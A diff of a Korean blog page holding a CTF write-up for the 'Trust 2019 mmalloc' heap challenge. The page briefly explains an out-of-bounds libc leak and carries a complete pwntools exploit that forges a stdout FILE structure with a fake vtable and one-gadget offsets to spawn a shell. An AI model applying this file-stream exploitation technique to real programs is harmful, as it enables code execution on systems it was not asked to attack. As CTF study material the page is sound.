@@ -9,18 +9,18 @@
   
   <title>Trust 2019 - mmalloc | 귀찮다</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="edit 메뉴와 show 메뉴에서 oob가 발생한다.  leakshow 메뉴에서 oob로 libc leak  exploitedit 메뉴로 stdout을 덮으면 됨 exploit  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545">
+  <meta name="description" content="edit 메뉴와 show 메뉴에서 oob가 발생한다.">
 <meta name="keywords" content="ctf, pwnable">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Trust 2019 - mmalloc">
 <meta property="og:url" content="https://blog.haklog.xyz/2019/05/25/mmaloc/index.html">
 <meta property="og:site_name" content="귀찮다">
-<meta property="og:description" content="edit 메뉴와 show 메뉴에서 oob가 발생한다.  leakshow 메뉴에서 oob로 libc leak  exploitedit 메뉴로 stdout을 덮으면 됨 exploit  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545">
+<meta property="og:description" content="edit 메뉴와 show 메뉴에서 oob가 발생한다.">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-11-01T02:23:38.174Z">
+<meta property="og:updated_time" content="2019-11-01T02:31:14.178Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Trust 2019 - mmalloc">
-<meta name="twitter:description" content="edit 메뉴와 show 메뉴에서 oob가 발생한다.  leakshow 메뉴에서 oob로 libc leak  exploitedit 메뉴로 stdout을 덮으면 됨 exploit  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545">
+<meta name="twitter:description" content="edit 메뉴와 show 메뉴에서 oob가 발생한다.">
   
   
     <link rel="icon" href="/img/one.png">
@@ -183,7 +183,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Ctf/" style="font-size: 10px;">Ctf</a> <a href="/tags/ctf-pwnable/" style="font-size: 15px;">ctf, pwnable</a> <a href="/tags/pwanble-ctf/" style="font-size: 10px;">pwanble, ctf</a> <a href="/tags/pwnable/" style="font-size: 20px;">pwnable</a> <a href="/tags/pwnable-ctf/" style="font-size: 10px;">pwnable, ctf</a> <a href="/tags/pwnable-ctf-heap-fake-chunk/" style="font-size: 10px;">pwnable, ctf, heap, fake_chunk</a> <a href="/tags/pwnable-kernel/" style="font-size: 10px;">pwnable, kernel</a> <a href="/tags/pwnable-tool/" style="font-size: 10px;">pwnable, tool</a>
+                        <a href="/tags/Ctf/" style="font-size: 10px;">Ctf</a> <a href="/tags/ctf-pwnable/" style="font-size: 15px;">ctf, pwnable</a> <a href="/tags/ctf-pwnable-kernel/" style="font-size: 10px;">ctf, pwnable, kernel</a> <a href="/tags/pwanble-ctf/" style="font-size: 10px;">pwanble, ctf</a> <a href="/tags/pwnable/" style="font-size: 20px;">pwnable</a> <a href="/tags/pwnable-ctf/" style="font-size: 10px;">pwnable, ctf</a> <a href="/tags/pwnable-ctf-heap-fake-chunk/" style="font-size: 10px;">pwnable, ctf, heap, fake_chunk</a> <a href="/tags/pwnable-kernel/" style="font-size: 10px;">pwnable, kernel</a> <a href="/tags/pwnable-tool/" style="font-size: 10px;">pwnable, tool</a>
                     </div>
                 </section>
                 
@@ -289,8 +289,10 @@
       
           
         <p>edit 메뉴와 show 메뉴에서 oob가 발생한다. </p>
-<h6 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h6><p>show 메뉴에서 oob로 libc leak </p>
-<h6 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h6><p>edit 메뉴로 stdout을 덮으면 됨</p>
+<a id="more"></a>
+
+
+<p>show 메뉴에서 libc leak하고<br>edit으로 stdout 수정해서 익스하면 된다.</p>
 <p>exploit </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./mmalloc"</span>)</span><br><span class="line"><span class="comment">#r = remote('c2w2m2.com', 56746)</span></span><br><span class="line">e = ELF(<span class="string">"./mmalloc"</span>)</span><br><span class="line">l = e.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(<span class="string">"1"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(<span class="string">"2"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, data)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(<span class="string">"3"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(idx))</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(<span class="string">"4"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">        r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">-80</span>)</span><br><span class="line"></span><br><span class="line">leak = r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span></span><br><span class="line">log.info(hex(int(u64(leak))))</span><br><span class="line"></span><br><span class="line">leak = int(u64(leak))</span><br><span class="line">base= leak - <span class="number">0x5f1140</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LIBC : "</span> + hex(base))</span><br><span class="line"></span><br><span class="line">stdin = l.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">stderr = l.symbols[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">stdout = l.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">stdfile = <span class="number">0x3c6780</span></span><br><span class="line"></span><br><span class="line">binsh = next(l.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">vtable = base+stdout + <span class="number">0x100</span></span><br><span class="line">stream = <span class="string">""</span></span><br><span class="line">stream += p64(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">stream += p64(base+stdin) + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">stream += p32(<span class="number">0x0a000000</span>)+ p32(<span class="number">0</span>) + p64(base + stdfile) </span><br><span class="line">stream += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>)</span><br><span class="line">stream += p64(base + <span class="number">0x3c47a0</span>) </span><br><span class="line">stream += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffff</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">stream += p64(vtable)</span><br><span class="line">stream += p64(base + stderr) </span><br><span class="line">stream += p64(base + stdout)</span><br><span class="line">stream += p64(base + stdin)</span><br><span class="line">stream += p64(base + <span class="number">0x20b70</span>)</span><br><span class="line">stream += p64(base + <span class="number">0x4526a</span>)* <span class="number">7</span> </span><br><span class="line">stream += p64(base + <span class="number">0x791e0</span>) + p64(<span class="number">0</span>) *<span class="number">20</span></span><br><span class="line">edit(<span class="number">-8</span>, stream)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -305,7 +307,7 @@
         <p><span>제목:</span><a  href="/2019/05/25/mmaloc/">Trust 2019 - mmalloc</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
         <p><span>발행 시간:</span>2019년05월25일 - 11시13분</p>
-        <p><span>마지막 업데이트:</span>2019년11월01일 - 11시23분</p>
+        <p><span>마지막 업데이트:</span>2019년11월01일 - 11시31분</p>
     </div>
 
 
@@ -322,8 +324,8 @@
     </a>
   
   
-    <a  href="/2019/05/11/post-2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">File Structure</div>
+    <a  href="/2019/05/16/post-3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">fsop - basic</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -335,7 +337,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">Article directory</strong>
-    <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#leak"><span class="toc-number">1.</span> <span class="toc-text">leak</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit"><span class="toc-number">2.</span> <span class="toc-text">exploit</span></a></li></ol>
+    
 </div>
 <style>
     .left-col .switch-btn {
@@ -437,12 +439,12 @@
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2019/05/11/post-2/" title="下一篇: File Structure">
+            <a  href="/2019/05/16/post-3/" title="下一篇: fsop - basic">
                 <i class="fa fa-angle-right"></i>
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/post-3/">fsop - basic</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/post-1/">Kernel Module</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/Hitcon-2016-babyheap/">Hitcon 2016 babyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/DEFCON 2019 speedrun010/">Defcon 2019 speedrun 010</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/25/mmaloc/">Trust 2019 - mmalloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/post-2/">File Structure</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/03/heapbabe/">Codegate 2018 final heapbabe</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/ropp/">Plaid CTF - ropasaurusrex</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/babypwn/">codegate 2017 CTF - babypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/exploit-exercise-fusion-01/">exploit-exercise-fusion-01</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/gadget-searcher/">gadget_searcher</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/post/">LINUX KERNEL EXPLOIT - 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/post-1/">Kernel Module</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/Hitcon-2016-babyheap/">Hitcon 2016 babyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/DEFCON 2019 speedrun010/">Defcon 2019 speedrun 010</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/25/mmaloc/">Trust 2019 - mmalloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/16/post-3/">fsop - basic</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/post-2/">File Structure</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/03/heapbabe/">Codegate 2018 final heapbabe</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/ropp/">Plaid CTF - ropasaurusrex</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/babypwn/">codegate 2017 CTF - babypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/exploit-exercise-fusion-01/">exploit-exercise-fusion-01</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/gadget-searcher/">gadget_searcher</a></li></ul>
     
 <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
